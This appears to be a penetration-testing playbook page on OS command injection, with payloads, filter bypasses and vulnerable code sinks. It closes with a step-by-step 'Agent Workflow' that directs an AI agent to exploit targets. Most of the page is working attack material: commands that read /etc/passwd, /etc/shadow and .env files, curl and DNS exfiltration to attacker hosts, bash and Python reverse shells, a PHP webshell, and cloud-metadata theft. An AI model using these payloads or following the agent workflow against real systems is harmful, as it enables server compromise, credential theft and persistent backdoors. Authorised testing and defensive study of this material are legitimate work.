# Command Injection

> **Summary**: OS command injection allows an attacker to execute arbitrary operating system commands on the server hosting an application.
> **Impact**: Full server compromise -- read/write files, pivot to internal networks, establish persistence, exfiltrate data.
> **Typical Severity**: Critical

---

## Detection

### Indicators
- User input flows into functions that spawn OS processes (e.g., `system()`, `exec()`, `popen()`)
- Application features that interact with the OS: ping, DNS lookup, file conversion, PDF generation, email sending
- Error messages leaking shell output or command paths

### Automated Detection
- Burp Suite Active Scanner / Intruder with command injection wordlists
- Commix (`python commix.py --url="<TARGET_URL>?ip=<INJECTION_POINT>"`)
- Nuclei templates tagged `os-command-injection`
- Custom wordlist: `https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt`

### Manual Detection
- Inject time-based payloads: `; sleep 5`, `| timeout /t 5` and observe response delay
- Inject DNS/HTTP callback: `` `nslookup <BURP_COLLABORATOR>` `` or `$(curl <CALLBACK_URL>)`
- Check common parameter names: `?cmd=`, `?exec=`, `?ping=`, `?query=`, `?ip=`, `?host=`, `?process=`, `?run=`, `?func=`, `?arg=`

### Where to Inject
- GET/POST parameters, path segments, JSON values
- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Host`, `Referer`, custom headers
- File names during upload, email addresses, DNS hostnames

---

## Exploitation

### Prerequisites
1. User-controlled input reaches an OS command execution sink
2. Insufficient input validation or sanitization
3. Knowledge of the target OS (Linux vs. Windows) for correct syntax

### Step-by-Step

1. **Identify the injection point** -- fuzz all input fields with basic separators (`;`, `|`, `||`)
   - Success criteria: observable change in response time, content, or OOB callback
2. **Confirm execution** -- use a safe command like `id` (Linux) or `whoami` (Windows)
   - Success criteria: command output reflected in the response body
3. **Determine blind vs. inline** -- if no output is reflected, test time-based (`sleep 5`) or OOB (`nslookup` to collaborator)
   - Success criteria: 5-second delay or DNS hit on collaborator
4. **Escalate** -- read sensitive files, establish reverse shell, pivot internally
   - Success criteria: shell access or data exfiltration confirmed

### Command Separators

```bash
# Both Linux and Windows
cmd1 | cmd2      # Pipe -- execute both, show output of cmd2
cmd1 || cmd2     # OR -- execute cmd2 if cmd1 fails
cmd1 & cmd2      # Background cmd1, execute cmd2
cmd1 && cmd2     # AND -- execute cmd2 only if cmd1 succeeds
cmd1 %0a cmd2    # Newline (URL-encoded) -- execute both (RECOMMENDED)

# Linux only
cmd1 ; cmd2      # Sequential execution
`cmd2`           # Backtick substitution
$(cmd2)          # Dollar-paren substitution

# Combining newlines and tabs
cmd1%0abash%09-c%09"cmd2"%0a
```

### Payloads by Detection Type

#### Inline (output reflected)
```bash
; cat /etc/passwd
| type C:\Windows\win.ini
$(whoami)
`id`
```

#### Time-Based Blind
```bash
; sleep 5
| timeout /t 5
& ping -c 5 127.0.0.1 &
$(sleep 5)
```

#### OOB (Out-of-Band) via DNS
```bash
; nslookup $(whoami).<BURP_COLLABORATOR>
| nslookup %USERNAME%.<BURP_COLLABORATOR>
`curl http://<CALLBACK_SERVER>/$(id | base64)`
; for i in $(ls /) ; do host "$i.<CALLBACK_DOMAIN>"; done
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').<CALLBACK_DOMAIN>)
```

#### Time-Based Data Exfiltration (char by char)
```bash
# Extracts first char of whoami output
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

### Proof of Concept
```bash
# Target: http://<TARGET>/ping?ip=127.0.0.1
# Payload:
GET /ping?ip=127.0.0.1%0aid HTTP/1.1

# Expected: uid=33(www-data) gid=33(www-data) in response
```

---

## Bypasses

### Space Filters
```bash
cat${IFS}/etc/passwd           # $IFS = Internal Field Separator (space/tab/newline)
cat$IFS/etc/passwd             # Without braces
{cat,/etc/passwd}              # Brace expansion
cat</etc/passwd                # Input redirection
cat%09/etc/passwd              # Tab character (URL-encoded)
X=$'cat\x20/etc/passwd'&&$X   # Hex-encoded space in variable
```

### Blacklisted Command Bypass
```bash
# Quote insertion
w'h'o'am'i
w"h"o"am"i

# Backslash insertion
w\ho\am\i

# Variable expansion
who$()ami
whoa$(echo m)i

# Wildcard globbing
/b?n/c?t /e?c/p?ss??
/b*/ca* /etc/passwd

# Reversed string
echo 'daomaohw' | rev

# Base64 encoding
echo d2hvYW1p | base64 -d | bash
bash<<<$(base64 -d<<<d2hvYW1p)

# Environment variable substring (Linux)
${PATH:0:1}           # Yields "/"
${LS_COLORS:10:1}     # May yield ";"
```

### Blacklisted Character Bypass
```bash
# Without slashes
$(tr '!-}' '"-~'<<<.telecat)  # Shifts chars to get /etc/passwd

# Without semicolons
payload %0a command %0a        # Use newlines instead

# Dollar sign alternatives
`command`                      # Backticks instead of $()
```

### Windows-Specific Bypass
```cmd
# Caret insertion
w^h^o^a^m^i
po^w^er^she^ll c:**32\c*?c.e?e    # Launches calc

# Environment variable substring
%COMSPEC:~-7,1%%COMSPEC:~-8,1%     # Yields "md" from cmd.exe path

# Wildcard path
powershell C:**2\n??e*d.*?          # Matches notepad
```

---

## Language-Specific Sinks

### PHP
```php
system("ping " . $_GET['ip']);
exec("nslookup " . $_GET['host']);
passthru("whois " . $_GET['domain']);
shell_exec("dig " . $_GET['query']);
popen("traceroute " . $_GET['target'], "r");
proc_open("ls " . $_GET['dir'], $descriptors, $pipes);
// Backtick operator:
$output = `cat {$_GET['file']}`;
```

### Python
```python
os.system("ping " + request.args.get("ip"))
os.popen("nslookup " + host)
subprocess.call("dig " + domain, shell=True)       # shell=True is the vulnerability
subprocess.Popen(cmd, shell=True)
```

### Node.js
```javascript
// VULNERABLE: exec() spawns /bin/sh -c, so all shell metacharacters work
const { exec } = require('child_process');
exec(`ping ${userInput}`, callback);

// SAFE: execFile() does NOT invoke a shell
const { execFile } = require('child_process');
execFile('/usr/bin/ping', ['-c', '1', userInput]);
```

### Java
```java
Runtime.getRuntime().exec("ping " + userInput);        // Simple form
Runtime.getRuntime().exec(new String[]{"sh","-c","ping " + userInput});  // Shell form
new ProcessBuilder("sh", "-c", "ping " + userInput).start();
```

---

## Argument/Option Injection

When input is passed as an argument (not through a shell), commands starting with `-` or `--` can inject options:

```bash
# curl -- write to arbitrary path
curl -o /tmp/webshell.php http://attacker/shell.php

# tar -- execute arbitrary command
tar cf archive.tar --checkpoint=1 --checkpoint-action=exec=id

# find -- command execution
find / -name "*.log" -exec /bin/sh -c 'id' \;

# git -- hooks execution
git clone --template=/attacker/controlled/path
```

### JVM Argument Injection
```bash
# Force crash + execute command on error
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="curl http://<ATTACKER>/shell.sh | sh"
```

---

## Escalation

- **Reverse shell**: `; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1`
- **Web shell upload**: `; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php`
- **Internal recon**: Use command injection as a pivot point for [SSRF](ssrf.md) or to read config files containing credentials
- **Chain with [SSTI](ssti.md)**: Template injection may lead to command injection if the template engine allows OS calls
- **Chain with [LFI](lfi.md)**: Log poisoning via command injection output into log files

---

## Tools

| Tool | Usage |
|------|-------|
| [Commix](https://github.com/commixproject/commix) | `commix --url="<URL>?param=<INJECT>" --os-cmd="id"` |
| [Burp Suite Intruder](https://portswigger.net) | Fuzz parameters with command injection wordlists |
| [Nuclei](https://github.com/projectdiscovery/nuclei) | `nuclei -u <URL> -tags cmd-injection` |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) | Comprehensive payload reference |
| [Collaborator/Interactsh](https://github.com/projectdiscovery/interactsh) | OOB detection for blind injection |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery

1. **Identify potential OS command injection points**
   ```bash
   # Crawl the application for endpoints
   katana -u <TARGET_URL> -d 3 -jc -o katana_output.txt
   paramspider -d <TARGET_DOMAIN> --output paramspider_output.txt
   cat katana_output.txt paramspider_output.txt | uro | grep "=" | sort -u > params.txt
   ```
   - Focus on parameters that likely interact with OS commands: `?cmd=`, `?exec=`, `?ping=`, `?ip=`, `?host=`, `?query=`, `?process=`, `?run=`, `?func=`, `?arg=`, `?dir=`, `?file=`, `?domain=`, `?address=`.
   - Look for application features that commonly invoke OS commands: ping/traceroute utilities, DNS lookups, file conversion tools, email sending, PDF generation, image processing, network diagnostics.

2. **Start an out-of-band interaction server**
   ```bash
   interactsh-client -v
   # Note the generated domain: <INTERACTSH_DOMAIN>
   ```

3. **Inject basic separator payloads** into each parameter:
   ```
   <VALUE>; id
   <VALUE>| id
   <VALUE>|| id
   <VALUE>& id
   <VALUE>&& id
   <VALUE>`id`
   <VALUE>$(id)
   <VALUE>%0a id
   ```
   - **Expected output**: Command output (e.g., `uid=33(www-data)...`) appears in the response.
   - **Decision**: If command output is visible, this is **inline command injection** -- proceed to Phase 2 for confirmation. If no visible output, test for blind injection.

4. **Test for blind injection (time-based)**:
   ```
   <VALUE>; sleep 5
   <VALUE>| sleep 5
   <VALUE>$(sleep 5)
   <VALUE>`sleep 5`
   <VALUE>%0a sleep 5
   <VALUE>| timeout /t 5    (Windows)
   <VALUE>& ping -c 5 127.0.0.1 &
   ```
   - **Expected output**: Response is delayed by ~5 seconds compared to normal response time.
   - **Decision**: If delay is observed, blind time-based injection is confirmed. If no delay, test OOB.

5. **Test for blind injection (OOB via DNS/HTTP)**:
   ```bash
   <VALUE>; nslookup <INTERACTSH_DOMAIN>
   <VALUE>| curl http://<INTERACTSH_DOMAIN>
   <VALUE>$(nslookup <INTERACTSH_DOMAIN>)
   <VALUE>`wget http://<INTERACTSH_DOMAIN>`
   ```
   - **Expected output**: DNS or HTTP callback received on interactsh/Collaborator.
   - **Decision**: If callback received, blind OOB injection confirmed.

6. **Also test injection in HTTP headers**:
   - Inject payloads into `User-Agent`, `X-Forwarded-For`, `Host`, `Referer`, and custom headers.
   - Some applications log or process these headers through shell commands.

### Phase 2: Validation

7. **Confirm injection type and determine OS**:

   - **If inline output** was observed:
     - Submit `; id` (Linux) or `| whoami` (Windows).
     - **If** `uid=` response --> Linux confirmed.
     - **If** `DOMAIN\username` response --> Windows confirmed.
     - Test all separator types to find which ones work: `;`, `|`, `||`, `&`, `&&`, `` ` ``, `$()`, `%0a`.

   - **If time-based blind** was confirmed:
     - Verify repeatability: test `sleep 5` twice to rule out network latency.
     - Determine OS: `; sleep 5` (Linux) vs `| timeout /t 5` (Windows) -- whichever causes delay reveals the OS.

   - **If OOB blind** was confirmed:
     - Exfiltrate OS info: `; nslookup $(whoami).<INTERACTSH_DOMAIN>`
     - **Expected output**: Collaborator receives DNS query with the username as subdomain.

8. **Run Commix for automated confirmation and exploitation**:
   ```bash
   python commix.py --url="<TARGET_URL>?<PARAM>=<VALUE>" --batch
   ```
   - **Expected output**: Commix identifies the injection point, separator, and technique.

### Phase 3: Exploitation

9. **Exfiltrate data based on injection type**:

   - **Inline**: Read files directly:
     ```
     ; cat /etc/passwd
     ; cat /etc/shadow
     ; cat /proc/self/environ
     ; cat /app/.env
     | type C:\Windows\win.ini
     ```

   - **Blind time-based**: Exfiltrate character by character:
     ```bash
     ; if [ $(whoami|cut -c 1) == w ]; then sleep 5; fi
     ```
     This is slow; prefer OOB if possible.

   - **Blind OOB**: Exfiltrate via DNS or HTTP:
     ```bash
     ; curl http://<ATTACKER>/exfil?data=$(cat /etc/passwd | base64 | tr -d '\n')
     ; nslookup $(whoami).<INTERACTSH_DOMAIN>
     ; for i in $(ls /); do host "$i.<INTERACTSH_DOMAIN>"; done
     ```

10. **If payloads are blocked by filters**, apply bypass techniques:
    - **Space filter**: Use `${IFS}`, `{cmd,arg}`, `%09` (tab), or `<` (input redirection).
    - **Blacklisted commands**: Use quote insertion (`w'h'o'am'i`), backslash (`w\ho\am\i`), base64 encoding (`echo d2hvYW1p|base64 -d|bash`), or wildcard globbing (`/b?n/c?t /e?c/p?ss??`).
    - **Windows**: Use caret insertion (`w^h^o^a^m^i`), environment variable substrings.
    - **Semicolon blocked**: Use `%0a` (newline) or `||` or `&&` instead.

### Phase 4: Escalation

11. **Establish reverse shell**:
    ```bash
    # Linux
    ; bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
    ; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
    ; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

    # Windows
    | powershell -e <BASE64_ENCODED_REVERSE_SHELL>
    ```
    - Set up listener: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>`.

12. **Write a webshell** for persistent access:
    ```bash
    ; echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php
    ```
    - Access at: `http://<TARGET>/shell.php?c=id`

13. **Internal reconnaissance** from the compromised server:
    ```bash
    ; ip addr show
    ; cat /etc/hosts
    ; env
    ; cat /proc/net/tcp
    ; curl http://169.254.169.254/latest/meta-data/   # Cloud metadata
    ```

14. **Chain with other vulnerabilities**:
    - Command injection --> read config files --> find database credentials --> [SQLi](sqli.md) or direct DB access.
    - Command injection --> cloud metadata --> [AWS](../cloud/aws.md) / [Azure](../cloud/azure.md) escalation.
    - Command injection --> write to web root --> persistent backdoor.
    - Command injection --> pivot to internal network --> [SSRF](ssrf.md)-like lateral movement.
    - Command injection --> log poisoning for [LFI](lfi.md) chains.

## Decision Tree

```
START: Inject separator payloads (; | || & && ` $() %0a) into each parameter
  |
  +-- Command output visible in response?
  |     |
  |     +-- YES --> INLINE COMMAND INJECTION
  |     |            +-- Determine OS: ; id (Linux) vs | whoami (Windows)
  |     |            +-- Read sensitive files (passwd, .env, web.config)
  |     |            +-- Establish reverse shell
  |     |            +-- SUCCESS
  |     |
  |     +-- NO --> Test time-based blind (; sleep 5, | timeout /t 5)
  |
  +-- Response delayed by ~5 seconds?
  |     |
  |     +-- YES --> BLIND TIME-BASED INJECTION
  |     |            +-- Confirm repeatability (test twice)
  |     |            +-- Determine OS (sleep vs timeout)
  |     |            +-- Exfiltrate via OOB if possible
  |     |            |     +-- ; curl http://<ATTACKER>/$(whoami)
  |     |            |     +-- Callback received? --> Exfiltrate data via HTTP/DNS
  |     |            +-- If no OOB, exfiltrate char by char (slow)
  |     |            +-- Establish reverse shell
  |     |            +-- SUCCESS
  |     |
  |     +-- NO --> Test OOB (nslookup/curl to Collaborator)
  |
  +-- Callback received on Collaborator/interactsh?
  |     |
  |     +-- YES --> BLIND OOB INJECTION
  |     |            +-- Exfiltrate data via DNS subdomains
  |     |            |     ; nslookup $(whoami).<COLLABORATOR>
  |     |            +-- Exfiltrate files via HTTP
  |     |            |     ; curl http://<ATTACKER>/$(cat /etc/passwd|base64)
  |     |            +-- Establish reverse shell
  |     |            +-- SUCCESS
  |     |
  |     +-- NO --> Apply bypass techniques
  |           +-- Space filter? --> Use ${IFS}, %09, {cmd,arg}
  |           +-- Keyword blocked? --> Use quote/backslash insertion, base64
  |           +-- Separator blocked? --> Try %0a, ||, &&, backticks
  |           +-- Retry with bypasses
  |           +-- Still no response? --> Command injection not exploitable
  |
  === ALSO TEST ===
  +-- HTTP headers (User-Agent, X-Forwarded-For, Referer)
  +-- File upload filenames
  +-- JSON/XML parameter values
  +-- Argument/option injection (-o, --checkpoint-action)
```

## Success Criteria

- **Confirmed inline injection**: OS command output (e.g., `uid=33(www-data)...` or `nt authority\system`) appears in the HTTP response.
- **Confirmed blind time-based injection**: Consistent ~5-second delay when `sleep 5` / `timeout /t 5` is injected, absent in normal requests.
- **Confirmed blind OOB injection**: Burp Collaborator or interactsh receives DNS/HTTP callback originating from the target server.
- **Data exfiltrated**: Contents of `/etc/passwd`, environment variables, or application configuration files retrieved.
- **Reverse shell obtained**: Interactive shell established from the target server to the attacker's listener.
- **Escalation confirmed**: Webshell deployed, cloud credentials extracted, or lateral movement to internal services achieved.

---

## References

- [PortSwigger -- OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings -- Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [OWASP -- Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [HackTricks -- Command Injection](https://book.hacktricks.wiki/pentesting-web/command-injection.html)
- Related: [SSTI](ssti.md) | [LFI](lfi.md) | [SSRF](ssrf.md)
